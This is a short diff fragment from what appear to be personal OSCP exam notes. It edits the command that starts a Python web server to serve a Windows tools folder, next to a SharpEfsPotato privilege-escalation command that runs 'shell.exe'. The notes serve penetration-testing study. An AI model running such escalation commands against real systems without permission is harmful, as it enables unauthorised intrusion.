@@ -14,7 +14,7 @@ This tool has never failed once on my side and is very reliable. You can look at
 ```./SharpEfsPotato.exe -p shell.exe```
 
 ```
-cd ~/Desktop/Tools/Windows && python -m http.server 80
+python -m http.server 80 --directory ~/Desktop/Tools/Windows
 ```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
